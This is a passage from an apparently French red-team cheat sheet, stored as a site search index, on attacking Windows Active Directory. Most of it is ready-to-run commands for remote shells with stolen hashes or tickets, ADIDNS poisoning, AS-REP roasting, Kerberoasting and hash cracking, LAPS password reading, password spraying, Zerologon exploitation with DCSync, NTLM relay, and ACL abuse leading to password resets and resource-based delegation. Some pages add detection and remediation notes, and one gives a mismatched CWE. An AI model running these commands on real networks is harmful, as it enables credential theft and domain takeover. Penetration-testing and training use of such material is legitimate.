C:\\users).fullname)){cat \"$user\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt\" -ErrorAction SilentlyContinue}\n</code></pre>"},{"location":"Red%20Team/Windows/Shell%20depuis%20linux/","title":"Shell depuis linux","text":""},{"location":"Red%20Team/Windows/Shell%20depuis%20linux/#psexec","title":"PsExec","text":""},{"location":"Red%20Team/Windows/Shell%20depuis%20linux/#avec-un-tgs","title":"Avec un TGS","text":"<pre><code>export KRB5CCNAME=truc.ccache\nimpacket-psexec -k -no-pass $domain/$user@$target\n</code></pre>"},{"location":"Red%20Team/Windows/Shell%20depuis%20linux/#avec-un-hash","title":"Avec un hash","text":"<pre><code>impacket-psexec $domain/$user@$target -hashes nt:lm\n</code></pre>"},{"location":"Red%20Team/Windows/Shell%20depuis%20linux/#avec-password","title":"Avec password","text":"<pre><code>impacket-psexec $domain/$user@$target\n</code></pre>"},{"location":"Red%20Team/Windows/Shell%20depuis%20linux/#wmiexec","title":"WmiExec","text":""},{"location":"Red%20Team/Windows/Shell%20depuis%20linux/#avec-un-tgs_1","title":"Avec un TGS","text":"<pre><code>export KRB5CCNAME=truc.ccache\nimpacket-wmiexec -k -no-pass $domain/$user@$target\n</code></pre>"},{"location":"Red%20Team/Windows/Shell%20depuis%20linux/#avec-un-hash_1","title":"Avec un hash","text":"<pre><code>impacket-wmiexec $domain/$user@$target -hashes nt:lm\n</code></pre>"},{"location":"Red%20Team/Windows/Shell%20depuis%20linux/#avec-password_1","title":"Avec password","text":"<pre><code>impacket-wmiexec $domain/$user@$target\n</code></pre>"},{"location":"Red%20Team/Windows/Shell%20depuis%20linux/#smbexec","title":"SmbExec","text":""},{"location":"Red%20Team/Windows/Shell%20depuis%20linux/#avec-un-tgs_2","title":"Avec un TGS","text":"<pre><code>export KRB5CCNAME=truc.ccache\nimpacket-smbexec -k -no-pass $domain/$user@$target\n</code></pre>"},{"location":"Red%20Team/Windows/Shell%20depuis%20linux/#avec-un-hash_2","title":"Avec un hash","text":"<pre><code>impacket-smbexec $domain/$user@$target -hashes nt:lm\n</code></pre>"},{"location":"Red%20Team/Windows/Shell%20depuis%20linux/#avec-password_2","title":"Avec password","text":"<pre><code>impacket-smbexec $domain/$user@$target\n</code></pre>"},{"location":"Red%20Team/Windows/Shell%20depuis%20linux/#atexec","title":"AtExec","text":""},{"location":"Red%20Team/Windows/Shell%20depuis%20linux/#avec-un-tgs_3","title":"Avec un TGS","text":"<pre><code>export KRB5CCNAME=truc.ccache\nimpacket-atexec -k -no-pass $domain/$user@$target $command\n</code></pre>"},{"location":"Red%20Team/Windows/Shell%20depuis%20linux/#avec-un-hash_3","title":"Avec un hash","text":"<pre><code>impacket-atexec $domain/$user@$target -hashes nt:lm $command\n</code></pre>"},{"location":"Red%20Team/Windows/Shell%20depuis%20linux/#avec-password_3","title":"Avec password","text":"<pre><code>impacket-atexec $domain/$user@$target $command\n</code></pre>"},{"location":"Red%20Team/Windows/Active%20Directory/ADIDNS/","title":"ADIDNS","text":""},{"location":"Red%20Team/Windows/Active%20Directory/ADIDNS/#poisoning","title":"Poisoning","text":"<p>Par d\u00e9faut, un utilisateur peut ajouter une entr\u00e9e dans le serveur dns de l'AD et faire pointer ce sous domaine vers, par exemple, l'ip d'un poste attaquant. Il est ensuite possible d'utiliser un outil tel que responder pour \u00e9ventuellement r\u00e9cup\u00e9rer des tentatives de connexions (imaginons par exemple un script de monitoring sur les diff\u00e9rentes entr\u00e9es du domaine, un lecteur r\u00e9seau qui n'est plus utilis\u00e9 ou autre...).</p> <p>Utilisation de dnstool (https://github.com/dirkjanm/krbrelayx/blob/master/dnstool.py)</p>"},{"location":"Red%20Team/Windows/Active%20Directory/ADIDNS/#ajouter-un-enregistrement-dns-depuis-linux","title":"Ajouter un enregistrement DNS (depuis linux):","text":"<pre><code>dnstool.py -u 'DOMAIN\\user' -p 'password' --record 'sousDomaine' --action add --data $AttackerIP $DomainController\n</code></pre>"},{"location":"Red%20Team/Windows/Active%20Directory/ADIDNS/#depuis-windows","title":"Depuis Windows:","text":"<pre><code>Set-ADIDNSNodeAttribute -Node sousDomaine -Attribute DNSRecord -Value (New-DNSRecordArray -Data $ATTACKER_IP) -Verbose\n\n# Activer/d\u00e9sactiver un node:\nEnable-ADIDNSNode -Node *\nDisable-ADIDNSNode -Node *\n</code></pre>"},{"location":"Red%20Team/Windows/Active%20Directory/ADIDNS/#utilisation-de-responder","title":"Utilisation de responder:","text":"<pre><code>sudo responder -I tun0 -d -D\n</code></pre> <p>Depuis Windows, il est possible d'automatiser le processus (Inveigh va checker si des appels DNS n'aboutissent \u00e0 rien, si c'est le cas il va cr\u00e9er l'entr\u00e9e DNS en question et la rediriger vers lui pour r\u00e9cup\u00e9rer d'\u00e9ventuelles informations):</p> <pre><code>Invoke-Inveigh -ConsoleOutput Y -ADIDNS combo,ns,wildcard -ADIDNSThreshold 3 -LLMNR Y -NBNS Y -mDNS Y -Challenge 1122334455667788 -MachineAccounts\n</code></pre>"},{"location":"Red%20Team/Windows/Active%20Directory/AsrepRoasting/","title":"AsrepRoasting","text":"<p>L'attaque AsrepRoasting consiste \u00e0 cibler les utilisateurs n'ayant pas l'attribut de pr\u00e9-authentification. Ceci permet alors de r\u00e9cup\u00e9rer un hash qui peut ensuite \u00eatre crack\u00e9. La dangerosit\u00e9 principale de cette technique est le fait qu'il n'est pas n\u00e9cessaire d'\u00eatre authentifi\u00e9 pour l'effectuer, le seul \u00e9l\u00e9ment n\u00e9cessaire est le nom du compte \u00e0 cibler (Il est possible d'\u00e9num\u00e9rer les comptes asreproastables directement si l'on est authentifi\u00e9, cependant).</p>"},{"location":"Red%20Team/Windows/Active%20Directory/AsrepRoasting/#linux","title":"Linux","text":""},{"location":"Red%20Team/Windows/Active%20Directory/AsrepRoasting/#enumeration-des-utilisateurs-sur-le-dc-et-des-comptes-asreproastables","title":"Enum\u00e9ration des utilisateurs sur le DC et des comptes asreproastables","text":"<pre><code>impacket-GetNPUsers domain.local/ -userfile /wordlist/username -format hashcat -outputfile asreproast.txt\n</code></pre>"},{"location":"Red%20Team/Windows/Active%20Directory/AsrepRoasting/#via-netexec","title":"Via netexec","text":"<pre><code>netexec ldap 10.10.10.10 -u users.txt -p '' --asreproast asreproast.txt\n</code></pre> <p>Si l'on est authentifi\u00e9 nous pouvons avoir acc\u00e8s \u00e0 la liste des utilisateurs via LDAP, ce qui permet d'identifier les comptes asreproastables sans avoir \u00e0 bruteforcer une liste d'utilisateur:</p> <pre><code>netexec ldap 10.10.10.10 -u $user -p $pass --asreproast asreproast.txt\n</code></pre>"},{"location":"Red%20Team/Windows/Active%20Directory/AsrepRoasting/#windows","title":"Windows","text":""},{"location":"Red%20Team/Windows/Active%20Directory/AsrepRoasting/#enumeration-des-utilisateurs-sur-le-dc-et-des-comptes-asreproastables_1","title":"Enum\u00e9ration des utilisateurs sur le DC et des comptes asreproastables","text":"<pre><code>.\\Rubeus.exe asreproast /format:hashcat /outfile:asreproast.txt\n</code></pre>"},{"location":"Red%20Team/Windows/Active%20Directory/AsrepRoasting/#crack-des-hash","title":"Crack des hash","text":""},{"location":"Red%20Team/Windows/Active%20Directory/AsrepRoasting/#cracker-les-hash-obtenus","title":"Cracker les hash obtenus","text":"<pre><code>hashcat asreproast.txt /usr/share/wordlists/rockyou.tar.gz\n</code></pre> Cat\u00e9gorie Information TTP Attaque par extraction de ticket AS-REP dans Kerberos CWE CWE-522 (Insufficiently Protected Credentials) Description de l'attaque AS-REP Roasting exploite les comptes Kerberos configur\u00e9s pour ne pas n\u00e9cessiter de preuve de connaissance du mot de passe (Pre-Authentication). Un attaquant peut demander des donn\u00e9es de ticket AS-REP pour ces comptes et tenter de craquer le mot de passe hors ligne. Impacts potentiels - Compromission des comptes utilisateurs- Acc\u00e8s non autoris\u00e9 aux services et donn\u00e9es- Possibilit\u00e9 d'\u00e9l\u00e9vation de privil\u00e8ges Comment la d\u00e9tecter - Surveillance des demandes de ticket AS-REP sans pr\u00e9-authentification- Analyse des journaux de serveur Kerberos pour les activit\u00e9s suspectes- Utilisation d'outils de d\u00e9tection d'intrusion Rem\u00e9diations/mitigations - Activer la pr\u00e9-authentification Kerberos pour tous les comptes- Utiliser des mots de passe forts et complexes- Auditer r\u00e9guli\u00e8rement les configurations de compte- Formation et sensibilisation des administrateurs syst\u00e8me Lien de r\u00e9f\u00e9rence Harmj0y's Blog - AS-REP Roasting"},{"location":"Red%20Team/Windows/Active%20Directory/Kerberoasting/","title":"Kerberoasting","text":"<p>Le kerberoasting consiste \u00e0 cibler les utilisateurs ayant un SPN. De ce fait, il est possible de r\u00e9cup\u00e9rer un TGS \u00e0 leur nom et ainsi de tenter de le cracker pour r\u00e9cup\u00e9rer le password du compte.</p> <p></p>"},{"location":"Red%20Team/Windows/Active%20Directory/Kerberoasting/#powershell","title":"Powershell","text":""},{"location":"Red%20Team/Windows/Active%20Directory/Kerberoasting/#lister-les-comptes-avec-un-spn","title":"Lister les comptes avec un SPN","text":"<pre><code>Get-DomainUser -SPN #powerview\n---\nGet-ADUser -Filter {ServicePrincipalName -ne \"$null\"} -Properties ServicePrincipalName #powershell\n</code></pre>"},{"location":"Red%20Team/Windows/Active%20Directory/Kerberoasting/#avec-rubeus","title":"Avec Rubeus","text":"<pre><code>Rubeus.exe kerberoast /stats\n</code></pre>"},{"location":"Red%20Team/Windows/Active%20Directory/Kerberoasting/#request-un-tgs","title":"Request un TGS","text":"<pre><code>Rubeus.exe kerberoast /user:utilisateur /simple\n</code></pre>"},{"location":"Red%20Team/Windows/Active%20Directory/Kerberoasting/#request-un-tgs-sans-downgrade-du-chiffrement-cela-permet-de-ne-demander-que-les-spn-avec-un-chiffrement-type-rc4_hmac-ce-qui-est-potentiellement-plus-stealthy","title":"Request un TGS sans downgrade du chiffrement. Cela permet de ne demander que les SPN avec un chiffrement type RC4_HMAC, ce qui est potentiellement plus stealthy","text":"<pre><code>Rubeus.exe kerberoast /stats /rc4opsec\nRubeus.exe kerberoast /user:utilisateur /simple /rc4opsec\n</code></pre>"},{"location":"Red%20Team/Windows/Active%20Directory/Kerberoasting/#en-net","title":"En .net","text":""},{"location":"Red%20Team/Windows/Active%20Directory/Kerberoasting/#request-dun-tgs","title":"Request d'un tgs","text":"<pre><code>Add-Type -AssemblyNAme System.IdentityModel \nNew-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList \"USSvc/serviceaccount\"\n</code></pre>"},{"location":"Red%20Team/Windows/Active%20Directory/Kerberoasting/#depuis-linux","title":"Depuis linux","text":""},{"location":"Red%20Team/Windows/Active%20Directory/Kerberoasting/#lister-les-comptes-avec-un-spn_1","title":"Lister les comptes avec un SPN","text":"<pre><code>netexec ldap -u \"user\" -p \"password\" --kerberoasting output.txt\n---\nimpacket-GetUserSPNs -dc-ip $ip -u \"\" -p \"\" $domain/$user\nimpacket-GetUserSPNs -dc-ip $ip $domain/$user -request -outputfile output.txt\n</code></pre>"},{"location":"Red%20Team/Windows/Active%20Directory/Kerberoasting/#cracker-le-tgs","title":"Cracker le tgs","text":"<pre><code>hashcat -m 13100 '$tgs' /usr/share/wordlist/rockyou.txt\n</code></pre> Cat\u00e9gorie Information TTP T1208 (Kerberoasting) CWE CWE-120 (Buffer Copy without Checking Size of Input ('Classic Buffer Overflow')) Description de l'attaque Kerberoasting exploite la fonctionnalit\u00e9 des tickets de service Kerberos dans les environnements Windows. Les attaquants extraient les tickets de service Kerberos et les craquent hors ligne pour obtenir des mots de passe d'utilisateurs de service faibles. Impacts potentiels - Acc\u00e8s non autoris\u00e9 aux ressources r\u00e9seau- Compromission de comptes de service- \u00c9l\u00e9vation de privil\u00e8ges Comment la d\u00e9tecter - Surveillance des demandes anormales de tickets de service Kerberos- Analyse des journaux pour les tentatives de connexion \u00e9chou\u00e9es fr\u00e9quentes- Utilisation d'outils de d\u00e9tection d'intrusion Rem\u00e9diations/mitigations - Utiliser des mots de passe forts pour les comptes de service- Appliquer la politique de s\u00e9curit\u00e9 Least Privilege- Mettre en \u0153uvre des audits r\u00e9guliers des comptes et des mots de passe- Utiliser Advanced Threat Protection pour surveiller les activit\u00e9s suspectes Lien de r\u00e9f\u00e9rence MITRE ATT&amp;CK - T1208: Kerberoasting"},{"location":"Red%20Team/Windows/Active%20Directory/LAPS/","title":"LAPS","text":"<p>Pour savoir si LAPS est utilis\u00e9, nous pouvons voir si nous trouvons un fichier AdmPwd.dll dans le dossier\u00a0<code>C:\\Program Files\\LAPS\\CSE</code></p>"},{"location":"Red%20Team/Windows/Active%20Directory/LAPS/#trouver-les-utilisateurs-ayant-le-droit-de-lire-les-passwords-laps","title":"Trouver les utilisateurs ayant le droit de lire les passwords LAPS","text":"<pre><code>Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {($_.ObjectAce -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -math 'ReadProperty')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_}\n</code></pre> <p>Si on compromet un utilisateur ayant le droit de lire les LAPS, on peut lire le password en clair en utilisant :</p> <pre><code>Get-DomainObject -Identity targtmachine$ | select -ExpandProperty ms-mcs-admpwd\n---\nGet-ADComputer -Identity targetmachine -Properties ms-mcs-admpwd | select -ExtandProperty ms-mcs-admpwd\n</code></pre>"},{"location":"Red%20Team/Windows/Active%20Directory/Password%20et%20hash%20spraying/","title":"Password et hash spraying","text":""},{"location":"Red%20Team/Windows/Active%20Directory/Password%20et%20hash%20spraying/#depuis-linux","title":"Depuis Linux","text":""},{"location":"Red%20Team/Windows/Active%20Directory/Password%20et%20hash%20spraying/#utilisation-de-kerbrute-pour-faire-du-password-spraying-sur-une-liste-dutilisateur-et-un-password","title":"Utilisation de kerbrute pour faire du password spraying sur une liste d'utilisateur et un password","text":"<pre><code>kerbrute passwordspray -d $domain --dc $ip users.txt  $password\n</code></pre>"},{"location":"Red%20Team/Windows/Active%20Directory/Password%20et%20hash%20spraying/#password-spraying-via-netexec","title":"password spraying via netexec","text":"<pre><code>netexec smb $ip -u users.txt -p $password | grep +\n</code></pre>"},{"location":"Red%20Team/Windows/Active%20Directory/Password%20et%20hash%20spraying/#hash-spraying-avec-netexec","title":"Hash spraying avec netexec","text":"<pre><code>netexec smb $ip -u users.txt -H hash.txt | grep +\n</code></pre>"},{"location":"Red%20Team/Windows/Active%20Directory/Password%20et%20hash%20spraying/#depuis-windows","title":"Depuis Windows","text":"<p>https://github.com/dafthack/DomainPasswordSpray</p> <pre><code>Import-Module .\\DomainPasswordSpray.ps1\n\nInvoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue\n</code></pre> Cat\u00e9gorie Information TTP Tentatives d'acc\u00e8s par essais de mots de passe communs sur de nombreux comptes CWE CWE-307 (Improper Restriction of Excessive Authentication Attempts) Description de l'attaque Le Password Spraying consiste \u00e0 tester un ou quelques mots de passe courants contre un grand nombre de comptes utilisateurs, r\u00e9duisant ainsi le risque de d\u00e9tection par rapport aux attaques de force brute classiques. Impacts potentiels - Acc\u00e8s non autoris\u00e9 \u00e0 de multiples comptes- Compromission de la s\u00e9curit\u00e9 des informations- Potentiel d'attaques plus larges sur le r\u00e9seau Comment la d\u00e9tecter - Surveillance des tentatives de connexion \u00e9chou\u00e9es sur de nombreux comptes- Analyse des journaux pour identifier les mod\u00e8les d'acc\u00e8s suspects- Utilisation de solutions de d\u00e9tection d'intrusion Rem\u00e9diations/mitigations - Mise en \u0153uvre de l'authentification multi-facteurs (MFA)- Politiques de mots de passe forts et vari\u00e9s- Verrouillage de compte apr\u00e8s un nombre limit\u00e9 de tentatives \u00e9chou\u00e9es- Formation et sensibilisation des utilisateurs sur la s\u00e9curit\u00e9 des mots de passe Lien de r\u00e9f\u00e9rence OWASP - Password Spraying Attack"},{"location":"Red%20Team/Windows/Active%20Directory/Zerologon/","title":"Zerologon","text":"<p>Dans la pratique, la faille Zerologon (CVE-2020-1472) permet \u00e0 un attaquant de prendre le contr\u00f4le d'un contr\u00f4leur de domaine, principalement de deux mani\u00e8res :</p>"},{"location":"Red%20Team/Windows/Active%20Directory/Zerologon/#remplacer-le-hash-du-dc-par-un-hash-null","title":"Remplacer le hash du DC par un hash null","text":"<p>Utilisation de https://github.com/dirkjanm/CVE-2020-1472/blob/master/cve-2020-1472-exploit.py : Cet exploit va remplacer le hash du DC par un hash null, le probl\u00e8me de cette m\u00e9thode est donc que l'AD va vite devenir inutilisable :</p>"},{"location":"Red%20Team/Windows/Active%20Directory/Zerologon/#depuis-linux","title":"Depuis Linux","text":""},{"location":"Red%20Team/Windows/Active%20Directory/Zerologon/#verifier-si-le-dc-est-vulnerable","title":"V\u00e9rifier si le DC est vuln\u00e9rable","text":"<pre><code>netexec smb 10.10.10.10 -u \"\" -p \"\" -M zerologon\n</code></pre>"},{"location":"Red%20Team/Windows/Active%20Directory/Zerologon/#exploitation-de-la-faille","title":"Exploitation de la faille","text":"<pre><code>cve-2020-1472-exploit.py 'nomDuDC' 'adresseIpDuDC'\n</code></pre> <pre><code>netexec smb 10.10.10.10 -u 'DC0$' -p '' --ntds\n</code></pre>"},{"location":"Red%20Team/Windows/Active%20Directory/Zerologon/#depuis-windows","title":"Depuis Windows","text":""},{"location":"Red%20Team/Windows/Active%20Directory/Zerologon/#lexploit-peut-se-faire-avec-mimikatz","title":"L'exploit peut se faire avec mimikatz","text":"<pre><code>lsadump::zerologon /target:dc.domain.local /account:DC$ /exploit\n</code></pre>"},{"location":"Red%20Team/Windows/Active%20Directory/Zerologon/#puis-on-effectue-le-dcsync","title":"Puis on effectue le DCSync","text":"<pre><code>lsadump::dcsync /domain:domain.local /dc:dc.domain.local /user:Administrator /authuser:DC$ /authdomain:domain /authpassword:\"\" /authntlm\n</code></pre>"},{"location":"Red%20Team/Windows/Active%20Directory/Zerologon/#relais-ntlm","title":"Relais NTLM","text":"<p>La seconde m\u00e9thode, plus \u00e9l\u00e9gante, permet d'utiliser un relais NTLM. Cette m\u00e9thode est plus simple et n'a pas la contrainte de remplacer le mot de passe du DC, n'entrainant donc pas d'instabilit\u00e9 de l'AD.</p> <p>Plusieurs pr\u00e9requis sont n\u00e9anmoins n\u00e9cessaires: - Le service PrintSpooler doit tourner sur le DC - Un compte utilisateur  - Un second DC</p> <p>Mise en place du relais NTLM :</p> <pre><code>ntlmrelayx -t dcsync://DC2 -smb2support\n</code></pre> <pre><code>printerbug.py 'domain.local'/user:Password@ipDC ipAttaquant\n</code></pre>"},{"location":"Red%20Team/Windows/Active%20Directory/ACE%20ACL%20DACL/ExtendedRight%20-%20User-Force-Change-Password/","title":"ExtendedRight   User Force Change Password","text":""},{"location":"Red%20Team/Windows/Active%20Directory/ACE%20ACL%20DACL/ExtendedRight%20-%20User-Force-Change-Password/#depuis-linux","title":"\ud83d\udc27 Depuis Linux","text":"<p>Pour changer le mot de passe d'un utilisateur depuis un environnement Linux, utilisez <code>rpcclient</code> comme suit :</p> <pre><code>rpcclient -U $monUser 10.10.10.192\nsetuserinfo2 $userCible$ 23 'password'\n</code></pre>"},{"location":"Red%20Team/Windows/Active%20Directory/ACE%20ACL%20DACL/ExtendedRight%20-%20User-Force-Change-Password/#depuis-windows","title":"\ud83c\udf54 Depuis Windows","text":"<p>Depuis Windows, vous pouvez utiliser PowerShell et le module <code>ActiveDirectory</code> :</p> <pre><code>Set-DomainUserPassword -Identity $userCible -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose\n</code></pre> <p>/!\\ Attention: penser \u00e0 mettre un mot de passe qui soit en accord avec la politique de mot de passe du domaine, sinon celui-ci ne sera pas modifi\u00e9 (et suivant le contexte, aucun message d'erreur) /!\\</p>"},{"location":"Red%20Team/Windows/Active%20Directory/ACE%20ACL%20DACL/GenericAll/","title":"GenericAll","text":"<p>Le droit <code>GenericAll</code> permet un contr\u00f4le total sur l'objet cible. Il peut \u00eatre appliqu\u00e9 \u00e0 des utilisateurs, des groupes ou des machines. Voici comment exploiter ce droit dans diff\u00e9rents contextes :</p>"},{"location":"Red%20Team/Windows/Active%20Directory/ACE%20ACL%20DACL/GenericAll/#genericall-sur-un-utilisateur","title":"\ud83d\udcddGenericAll sur un Utilisateur","text":"<p>Si un utilisateur a le droit <code>GenericAll</code> sur un autre utilisateur, il est possible de r\u00e9initialiser le mot de passe de l'utilisateur cible.</p>"},{"location":"Red%20Team/Windows/Active%20Directory/ACE%20ACL%20DACL/GenericAll/#depuis-windows","title":"\ud83c\udf54 Depuis Windows","text":"<p>Utilisez la commande suivante pour r\u00e9initialiser le mot de passe d'un utilisateur depuis un environnement Windows :</p> <pre><code>net user $userCible $nouveauPassword /domain\n</code></pre>"},{"location":"Red%20Team/Windows/Active%20Directory/ACE%20ACL%20DACL/GenericAll/#depuis-linux","title":"\ud83d\udc27 Depuis Linux","text":"<p>Depuis un environnement Linux, vous pouvez utiliser la commande suivante :</p> <pre><code>net rpc user password $userCible $nouveauPass -U domain.local/$noreUser -S $dc\n</code></pre> <p>Mettre un mot de passe en ad\u00e9quation avec la politique de mot de passe du domaine, sinon celui-ci ne sera pas attribu\u00e9 et rien ne nous l'indique.</p>"},{"location":"Red%20Team/Windows/Active%20Directory/ACE%20ACL%20DACL/GenericAll/#genericall-sur-un-groupe","title":"\ud83d\udcdd GenericAll sur un Groupe","text":"<p>Si un utilisateur a le droit <code>GenericAll</code> sur un groupe, il peut s'ajouter en tant que membre de ce groupe.</p>"},{"location":"Red%20Team/Windows/Active%20Directory/ACE%20ACL%20DACL/GenericAll/#depuis-windows_1","title":"\ud83c\udf54 Depuis Windows","text":"<p>Utilisez les commandes suivantes pour ajouter un utilisateur \u00e0 un groupe depuis un environnement Windows :</p> <pre><code>net group \"$groupeCible\" $userCible /add /domain #cmd\nAdd-ADGroupMember -Identity \"$groupeCible\" -Members $userCible #powershell\nAdd-ADGroupMember -Identity \"$groupeCible\" -Members $userCible #powersploit\n</code></pre>"},{"location":"Red%20Team/Windows/Active%20Directory/ACE%20ACL%20DACL/GenericAll/#genericall-sur-une-machine","title":"\ud83d\udcdd GenericAll sur une Machine","text":"<p>Le droit <code>GenericAll</code> sur une machine permet d'abuser de la Resource-Based Constrained Delegation (RBCD).</p>"},{"location":"Red%20Team/Windows/Active%20Directory/ACE%20ACL%20DACL/GenericAll/#depuis-windows_2","title":"\ud83c\udf54 Depuis Windows","text":"<p>Pour exploiter ce droit, nous avons besoin des scripts <code>powermad.ps1</code> et <code>powerview</code>.</p> <p>Cr\u00e9ation d'un compte machine :</p> <pre><code>import-module powermad\nNew-MachineAccount -MachineAccount paked -Password $(ConvertTo-SecureString 'Sup3P4ssw0rd!' -AsPlainText -Force) -Verbose\n</code></pre> <p>V\u00e9rification de la cr\u00e9ation du compte :</p> <pre><code>Get-DomainComputer\n</code></pre> <p>\u00c9criture de la propri\u00e9t\u00e9 <code>msds-allowedtoactonbehalfofotheridentity</code> sur le compte machine cible :</p> <pre><code>$ComputerSid = Get-DomainComputer paked -Properties objectsid | Select -Expand objectsid\n\n$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList \"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)\"\n\n$SDBytes = New-Object byte[] ($SD.BinaryLength)\n\n$SD.GetBinaryForm($SDBytes, 0)\n\nGet-DomainComputer $cible | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}\n</code></pre> <p>R\u00e9cup\u00e9ration du hash du compte machine cr\u00e9\u00e9 :</p> <pre><code>.\\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local\n</code></pre> <p>R\u00e9cup\u00e9ration du ticket de l'utilisateur ayant des droits sur le compte machine cible :</p> <pre><code>rubeus.exe s4u /user:paked$ /aes256:&lt;aes256&gt; /aes128:&lt;aes128&gt; /rc4:&lt;rc4 hash&gt; /impersonateuser:administrator /msdsspn:cifs/cible /domain:domain.local /ptt /altservice:http/cible\n</code></pre>"},{"location":"Red%20Team/Windows/Active%20Directory/ACE%20ACL%20DACL/GenericAll/#depuis-linux_1","title":"\ud83d\udc27 Depuis Linux","text":"<p>Cr\u00e9ation d'un compte machine :</p> <pre><code>impacket-addcomputer -computer-name 'COMPUTER$' -computer-pass '$password' -dc-host $dc -domain-netbios $DOMAIN 'domain.local\\$user:$password'\n</code></pre> <p>\u00c9criture de la propri\u00e9t\u00e9 <code>msds-allowedtoactonbehalfofotheridentity</code> sur le compte machine cible :</p> <pre><code>impacket-rbcd -delegate-from 'paked$' -delegate-to 'cible$' -dc-ip '$dc$' -action 'write' 'domain.local'/'$utilisateur':'$Password'\n</code></pre> <p>R\u00e9cup\u00e9ration du ticket de l'utilisateur ayant des droits sur le compte machine cible :</p> <pre><code>impacket-getST -spn 'cifs/$cible' -impersonate Administrator -dc-ip '$dc' 'domain.local/paked$:$password'\n</code></pre>"},{"location":"Red%20Team/Windows/Active%20Directory/ACE%20ACL%20DACL/GenericWrite%20-%20GenericAll/","title":"GenericWrite   GenericAll","text":""},{"location":"Red%20Team/Windows/Active%20Directory/ACE%20ACL%20DACL/GenericWrite%20-%20GenericAll/#ajout-dun-spn-pour-kerberoasting","title":"\ud83d\udcdd Ajout d'un SPN pour Kerberoasting","text":"<p>Si notre utilisateur a les droits <code>GenericWrite</code> ou <code>GenericAll</code> sur un objet de l'AD, il est possible de mettre un SPN sur cet objet, ce qui le rend par la suite kerberoastable.</p> <p>\u00c9num\u00e9ration des droits de notre utilisateur :</p> <pre><code>Find-InterestingDomainACL -ResolveGUIDs | ?{$_.IdentityReferenceName -match \"notreUser\"}\n</code></pre> <p>Mise en place d'un SPN sur l'utilisateur cible :</p> <pre><code>Set-DomainObject -Identity UtilisateurCible -Set @{serviceprincipalname='us/hackedBro'}\n---\nSet-ADUser -Identity UtilisateurCible -ServicePrincipalNames @{add='us/hackedBro'}\n</code></pre> <p>Kerberoasting de l'utilisateur :</p> <pre><code>Rubeus.exe kerberoast /outfile:target.txt\n</code></pre> <p>Cracking du hash :</p> <pre><code>hashcat '$tgs' /ush/share/wordlist/rockyou.txt\n</code></pre>"},{"location":"Red%20Team/Windows/Active%20Directory/ACE%20ACL%20DACL/GenericWrite%20-%20GenericAll/#changement-direct-de-mot-de-passe-avec-genericall","title":"Changement direct de mot de passe avec <code>GenericAll</code>","text":"<p>Avec le droit <code>GenericAll</code>, il est possible de changer directement le mot de passe de l'objet sur lequel le droit s'applique, mais cette action est beaucoup moins \"safe\" que d'ajouter un SPN :</p> <pre><code>net user userCible password /domain\n</code></pre>"},{"location":"Red%20Team/Windows/Active%20Directory/ACE%20ACL%20DACL/GenericWrite%20-%20GenericAll/#ajout-a-un-groupe-avec-genericall","title":"Ajout \u00e0 un groupe avec <code>GenericAll</code>","text":"<p>Si le droit <code>GenericAll</code> s'applique sur un groupe, il est possible de s'ajouter dans ce groupe :</p> <pre><code>net group \"groupe\" user /add /domain\n</code></pre>"},{"location":"Red%20Team/Windows/Active%20Directory/ACE%20ACL%20DACL/GenericWrite%20-%20GenericAll/#genericwrite-sur-un-compte-machine","title":"\ud83d\udcdd GenericWrite sur un compte machine","text":"<p>Ce droit permet d'abuser de la Resource-Based Constrained Delegation (RBCD).</p>"},{"location":"Red%20Team/Windows/Active%20Directory/ACE%20ACL%20DACL/GenericWrite%20-%20GenericAll/#depuis-windows","title":"\ud83c\udf54 Depuis Windows","text":"<p>Pour exploiter ce droit, nous avons besoin des scripts <code>powermad.ps1</code> et <code>[PowerView](../../../Cheatsheets/Tools/PowerView.md)</code>.</p> <p>Cr\u00e9ation d'un compte machine :</p> <pre><code>import-module powermad\nNew-MachineAccount -MachineAccount paked -Password $(ConvertTo-SecureString 'Sup3P4ssw0rd!' -AsPlainText -Force) -Verbose\n</code></pre> <p>V\u00e9rification de la cr\u00e9ation du compte :</p> <pre><code>Get-DomainComputer\n</code></pre> <p>\u00c9criture de la propri\u00e9t\u00e9 <code>msds-allowedtoactonbehalfofotheridentity</code> sur le compte machine cible :</p> <pre><code>$ComputerSid = Get-DomainComputer paked -Properties objectsid | Select -Expand objectsid\n\n$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList \"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)\"\n\n$SDBytes = New-Object byte[] ($SD.BinaryLength)\n\n$SD.GetBinaryForm($SDBytes, 0)\n\nGet-DomainComputer $cible | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}\n</code></pre> <p>R\u00e9cup\u00e9ration du hash du compte machine cr\u00e9\u00e9 :</p> <pre><code>.\\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local\n</code></pre> <p>R\u00e9cup\u00e9ration du ticket de l'utilisateur ayant des droits sur le compte machine cible :</p> <pre><code>rubeus.exe s4u /user:paked$ /aes256:&lt;aes256&gt; /aes128:&lt;aes128&gt; /rc4:&lt;rc4 hash&gt; /impersonateuser:administrator /msdsspn:cifs/cible /domain:domain.local /ptt /altservice:http/cible\n</code></pre>"},{"location":"Red%20Team/Windows/Active%20Directory/ACE%20ACL%20DACL/GenericWrite%20-%20GenericAll/#depuis-linux","title":"\ud83d\udc27 Depuis Linux","text":"<p>Cr\u00e9ation d'un compte machine :</p> <pre><code>impacket-addcomputer -computer-name 'COMPUTER$' -computer-pass '$password' -dc-host $dc -domain-netbios $DOMAIN 'domain.local\\$user:$password'\n</code></pre> <p>\u00c9criture de la propri\u00e9t\u00e9 <code>msds-allowedtoactonbehalfofotheridentity</code> sur le compte machine cible :</p> 